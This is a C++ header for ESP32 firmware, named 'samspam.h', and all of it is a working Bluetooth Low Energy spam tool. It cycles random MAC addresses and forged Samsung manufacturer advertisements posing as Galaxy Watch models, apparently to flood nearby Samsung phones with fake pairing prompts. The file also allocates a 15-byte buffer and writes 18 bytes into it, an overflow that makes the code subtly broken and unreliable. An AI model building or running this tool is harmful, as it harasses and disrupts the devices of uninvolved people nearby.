// samspam.h
#ifndef SAMSPAM_H
#define SAMSPAM_H

#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_gap_ble_api.h>

bool samspamActive = false;

const char* watchNames[] = {
  "Black Watch4 Classic 40mm", "White Watch4 Classic 40mm",
  "Black Watch4 44mm", "Silver Watch4 44mm",
  "Black Watch5 44mm", "Sapphire Watch5 44mm",
  "Black Watch5 Pro 45mm", "Gray Watch5 Pro 45mm",
  "Black Watch6 Pink 40mm", "Gold Watch6 Gold 40mm"
};

const uint8_t watchIDs[] = {
  0x01, 0x02, 0x03, 0x04, 0x05,
  0x11, 0x12, 0x13, 0x14, 0x15
};

const uint8_t PREPEND[] = {0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43};

void startSamSpam() {
  samspamActive = true;
  BLEDevice::init("unknown");
  Serial.println("SamSpam started");
}

void stopSamSpam() {
  samspamActive = false;
  esp_ble_gap_stop_advertising();
  Serial.println("SamSpam stopped");
}

static esp_ble_adv_params_t samAdvParams = {
  .adv_int_min = 160,
  .adv_int_max = 160,
  .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .channel_map = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY
};

void runSamSpam() {
  if (!samspamActive) return;
  
  int idx = random(sizeof(watchIDs) / sizeof(watchIDs[0]));
  
  uint8_t addr[6];
  for (int i = 0; i < 6; i++) addr[i] = esp_random() & 0xFF;
  addr[5] = (addr[5] & 0x3F) | 0xC0;
  esp_ble_gap_set_rand_addr(addr);
  
  esp_ble_gap_set_device_name(watchNames[idx]);
  
  size_t prependLen = sizeof(PREPEND);
  size_t totalLen = 2 + prependLen + 1;
  
  uint8_t* advData = (uint8_t*)malloc(totalLen + 2);
  int i = 0;
  advData[i++] = 0x02;
  advData[i++] = 0x01;
  advData[i++] = 0x06;
  
  advData[i++] = totalLen + 1;
  advData[i++] = 0xFF;
  advData[i++] = 0x75;
  advData[i++] = 0x00;
  
  memcpy(&advData[i], PREPEND, prependLen);
  i += prependLen;
  advData[i++] = watchIDs[idx];
  
  esp_ble_gap_config_adv_data_raw(advData, i);
  esp_ble_gap_start_advertising(&samAdvParams);
  delay(200);
  esp_ble_gap_stop_advertising();
  free(advData);
  delay(10);
}

#endif
